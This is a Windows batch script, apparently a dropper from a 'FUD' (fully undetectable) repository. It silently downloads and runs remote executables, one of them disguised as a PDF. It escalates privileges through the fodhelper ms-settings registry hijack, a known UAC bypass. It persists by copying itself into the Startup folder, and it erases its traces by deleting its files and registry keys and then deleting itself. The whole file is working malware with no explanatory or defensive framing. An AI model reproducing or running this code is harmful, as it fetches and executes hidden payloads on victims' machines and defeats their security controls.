@echo off
setlocal

:: Set the download URL and the target paths
set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/sammur.zip"
set "zip_output=C:\Users\%USERNAME%\AppData\sammur.zip"
set "exe_output=C:\Users\%USERNAME%\AppData\sammur.exe"

:: Download the sammur.zip file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%zip_output%'" >nul 2>&1

:: Check if the download was successful
if exist "%zip_output%" (
    :: Extract sammur.exe from sammur.zip silently
    powershell -command "Expand-Archive -Path '%zip_output%' -DestinationPath 'C:\Users\%USERNAME%\AppData\' -Force" >nul 2>&1
) else (
    exit /b 1
)

:: Check if extraction was successful (sammur.exe exists)
if exist "%exe_output%" (
    rem Extraction successful, proceed
) else (
    exit /b 1
)

:: Create the registry key for ms-settings silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1

:: Set the DelegateExecute property silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1

:: Wait for 9 seconds silently (increased by 5 seconds)
timeout /t 9 /nobreak >nul 2>&1

:: Set the default value to run sammur.exe silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "%exe_output%" /f >nul 2>&1

:: Wait for another 9 seconds silently (increased by 5 seconds)
timeout /t 9 /nobreak >nul 2>&1

:: Start fodhelper.exe silently to escalate privileges
start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1

:: Wait for 9 seconds silently (increased by 5 seconds)
timeout /t 9 /nobreak >nul 2>&1

:: Set the download URL and the target path for Client.pdf
set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
set "output2=C:\Users\%USERNAME%\AppData\Local\sam.exe"

:: Download the Client.pdf file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%' -UseBasicP -ErrorAction Stop" >nul 2>&1

:: Check if the download was successful without echoing messages
if exist "%output2%" (
    rem Downloaded successfully, proceed to rename
) else (
    exit /b 1
)

:: Convert Client.pdf to sam.exe by renaming silently
ren "%output2%" "sam.exe" >nul 2>&1

:: Run sam.exe two times silently
start /min "" "%output2:pdf=exe%" >nul 2>&1
timeout /t 4 /nobreak >nul 2>&1  :: Increased by 2 seconds
start /min "" "%output2:pdf=exe%" >nul 2>&1

:: Wait for 6 seconds before deleting files (increased by 3 seconds)
timeout /t 6 /nobreak >nul 2>&1

:: Delete sammur.exe and sammur.zip
del "%exe_output%" >nul 2>&1
del "%zip_output%" >nul 2>&1

:: Remove the ms-settings registry key immediately before self-deletion
powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1

:: Add sam.exe to startup folder (this ensures it runs automatically at system startup)
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%output2:pdf=exe%" "%startup_folder%\sam.exe" >nul 2>&1

:: Delete the expert.bat file in ProgramData if it exists
set "expert_bat=C:\ProgramData\expert.bat"
if exist "%expert_bat%" (
    del "%expert_bat%" >nul 2>&1
)

:: Create a secondary batch script to delete this script
(
echo @echo off
echo :Repeat
echo del "%~f0" ^>nul 2^>^&1
echo if exist "%~f0" goto Repeat
) > "%TEMP%\delete_self.bat"

:: Run the secondary batch script to delete this script
start /min "" "%TEMP%\delete_self.bat"

endlocal
